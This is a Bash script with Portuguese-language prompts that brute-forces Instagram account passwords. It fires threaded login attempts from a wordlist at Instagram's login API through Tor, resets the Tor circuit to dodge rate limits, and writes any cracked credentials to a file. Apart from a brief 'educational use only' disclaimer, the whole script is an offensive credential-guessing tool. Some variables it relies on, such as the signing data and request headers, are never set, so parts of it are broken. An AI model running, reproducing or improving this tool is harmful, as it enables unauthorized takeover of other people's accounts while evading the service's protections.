#!/bin/bash

trap 'store;exit 1' 2
string4=$(openssl rand -hex 32 | cut -c 1-4)
string8=$(openssl rand -hex 32  | cut -c 1-8)
string12=$(openssl rand -hex 32 | cut -c 1-12)
string16=$(openssl rand -hex 32 | cut -c 1-16)
device="android-$string16"
uuid=$(openssl rand -hex 32 | cut -c 1-32)
phone="$string8-$string4-$string4-$string4-$string12"
guid="$string8-$string4-$string4-$string4-$string12"
var=$(curl -i -s -H "$header" https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid > /dev/null)
var2=$(echo $var | awk -F ';' '{print $2}' | cut -d '=' -f3)

checkroot() {
if [[ "$(id -u)" -ne 0 ]]; then
    printf "\e[1;77m 🛡️ Por favor, execute este programa como root!\n\e[0m"
    exit 1
fi
}

dependencies() {
command -v openssl > /dev/null 2>&1 || { echo >&2 "❌ O openssl é necessário, mas não está instalado. Abortando."; exit 1; }
command -v tor > /dev/null 2>&1 || { echo >&2 "❌ O tor é necessário, mas não está instalado. Abortando."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "❌ O curl é necessário, mas não está instalado. Abortando."; exit 1; }
command -v awk > /dev/null 2>&1 || { echo >&2 "❌ O awk é necessário, mas não está instalado. Abortando."; exit 1; }
command -v cat > /dev/null 2>&1 || { echo >&2 "❌ O cat é necessário, mas não está instalado. Abortando."; exit 1; }
command -v tr > /dev/null 2>&1 || { echo >&2 "❌ O tr é necessário, mas não está instalado. Abortando."; exit 1; }
command -v wc > /dev/null 2>&1 || { echo >&2 "❌ O wc é necessário, mas não está instalado. Abortando."; exit 1; }
command -v cut > /dev/null 2>&1 || { echo >&2 "❌ O cut é necessário, mas não está instalado. Abortando."; exit 1; }
command -v uniq > /dev/null 2>&1 || { echo >&2 "❌ O uniq é necessário, mas não está instalado. Abortando."; exit 1; }
command -v sed > /dev/null 2>&1 || { echo >&2 "❌ O sed é necessário, mas não está instalado. Abortando."; exit 1; }

if [ $(ls /dev/urandom >/dev/null; echo $?) == "1" ]; then
echo "/dev/urandom não encontrado!"
exit 1
fi

}


banner() {

printf "\e[1;38;5;196m  ███████╗ █████╗ ████████╗ █████╗ ███╗   ██╗ ██████╗  \e[0m\n"
printf "\e[1;38;5;196m  ██╔════╝██╔══██╗╚══██╔══╝██╔══██╗████╗  ██║██╔═══██╗ \e[0m\n"
printf "\e[1;38;5;40m  ███████╗███████║   ██║   ███████║██╔██╗ ██║██║   ██║ \e[0m\n"
printf "\e[1;38;5;40m  ╚════██║██╔══██║   ██║   ██╔══██║██║╚██╗██║██║   ██║ \e[0m\n"
printf "\e[1;38;5;196m  ███████║██║  ██║   ██║   ██║  ██║██║ ╚████║╚██████╔╝ \e[0m\n"
printf "\e[1;38;5;196m  ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝  \e[0m\n"
printf "\n"
printf "\e[1;38;5;196m                >>> FORÇA BRUTA <<<                \e[0m\n"
printf "\n"
printf "\e[1;77m\e[45m        Força Bruta do Instagram - Satano       \e[0m\n"
printf "\n"

}


cat <<EOF
Este script foi projetado e desenvolvido
por mim Satano para fins educacionais e de teste de penetração apenas.
Sob a Licença Pública Geral GNU v3.0 (GPL-3.0)
O que significa que, se alguém usar ou modificar este código,
também deverá disponibilizar o trabalho derivado sob os mesmos termos,
tornando-o sujeito a direitos autorais e às mesmas condições de licença.
EOF


function start() {
banner
checkroot
dependencies
read -p $'\e[1;92m 📝 Digite o nome de usuário da conta: \e[0m' user
checkaccount=$(curl -s https://www.instagram.com/$user/?__a=1 | grep -c "O usuário pode ter sido banido ou a página foi deletada/inexistente/nenhum usuário (com este nome)")
if [[ "$checkaccount" == 1 ]]; then
printf "\e[1;91m ❌ Nome de usuário inválido! Tente novamente\e[0m\n"
sleep 1
start
else
default_wl_pass="default-passwords.lst"
read -p $'\e[1;92m 📃 Digite o nome da lista de senhas personalizada (Enter para usar a lista padrão): \e[0m' wl_pass
wl_pass="${wl_pass:-${default_wl_pass}}"
default_threads="15"
read -p $'\e[1;92m 🔗 Threads para usar ao testar senhas (Sempre use < 20, Padrão: 15): \e[0m' threads
threads="${threads:-${default_threads}}"
fi
}

checktor() {

check=$(curl --socks5 localhost:9050 -s https://check.torproject.org > /dev/null; echo $?)

if [[ "$check" -gt 0 ]]; then
printf "\e[1;91m 🧅 Por favor, verifique sua conexão TOR! Digite tor ou service tor start\n\e[0m"
exit 1
fi

}

function store() {

if [[ -n "$threads" ]]; then
printf "\e[1;91m [*] Aguardando o encerramento das threads...\n\e[0m"
if [[ "$threads" -gt 10 ]]; then
sleep 6
else
sleep 3
fi
default_session="Y"
printf "\n\e[1;77m 📲 Salvar sessão para o usuário \e[0m\e[1;92m %s \e[0m" $user
read -p $'\e[1;77m? ❓ [Y/n]: \e[0m' session
session="${session:-${default_session}}"
if [[ "$session" == "Y" || "$session" == "y" || "$session" == "yes" || "$session" == "Yes" ]]; then
if [[ ! -d sessions ]]; then
mkdir sessions
fi
printf "user=\"%s\"\npass=\"%s\"\nwl_pass=\"%s\"\n" $user $pass $wl_pass > sessions/store.session.$user.$(date +"%FT%H%M")
printf "\e[1;77m ✔️ Sessão salva.\e[0m\n"
printf "\e[1;92m Use ./instashell --resume\n"
else
exit 1
fi
else
exit 1
fi
}

function changeip() {

killall -HUP tor
#sleep 3

}

function bruteforcer() {

checktor
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
printf "\e[1;92mUsuário:\e[0m\e[1;77m %s\e[0m\n" $user
printf "\e[1;92mLista de senhas:\e[0m\e[1;77m %s (%s)\e[0m\n" $wl_pass $count_pass
printf "\e[1;91m[*] Pressione Ctrl + C para parar ou salvar a sessão\n\e[0m"

startline=1
endline="$threads"
while [ true ]; do
IFS=$'\n'
for pass in $(sed -n ''$startline','$endline'p' $wl_pass); do

printf "\e[1;77mTentando senha (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass

{(trap '' SIGINT && var=$(curl --socks5 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "200\|challenge\|many tries\|Please wait"| uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Senha encontrada: %s\n [*] Desafio requerido\n" $pass; printf "Usuário: %s, Senha: %s\n" $user $pass >> found.passwords ; printf "\e[1;92m [*] Salvo em:\e[0m\e[1;77m found.passwords \n\e[0m";  kill -1 $$ ; elif [[ $var == "200" ]]; then printf "\e[1;92m \n [*] Senha encontrada: %s\n" $pass; printf "Usuário: %s, Senha: %s\n" $user $pass >> found.passwords ; printf "\e[1;92m [*] Salvo em:\e[0m\e[1;77m found.passwords \n\e[0m"; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then changeip; fi; ) } & done; wait $!;
let startline+=$threads
let endline+=$threads
changeip
done
}

function resume() {

banner 
checktor
counter=1
if [[ ! -d sessions ]]; then
printf "\e[1;91m[*] Nenhuma sessão encontrada\n\e[0m"
exit 1
fi
printf "\e[1;92mArquivos de sessão:\n\e[0m"
read -p $'\e[1;92mEscolha o número da sessão: \e[0m' fileresume
read -p $'\e[1;92mThreads (Use < 20, Padrão 10): \e[0m' threads
threads="${threads:-${default_threads}}"

printf "\e[1;92m[*] Retomando sessão para o usuário:\e[0m \e[1;77m%s\e[0m\n" $user
printf "\e[1;92m[*] Lista de senhas: \e[0m \e[1;77m%s\e[0m\n" $wl_pass
printf "\e[1;91m[*] Pressione Ctrl + C para parar ou salvar a sessão\n\e[0m"
}

case "$1" in --resume) resume ;; *)
start
bruteforcer
esac
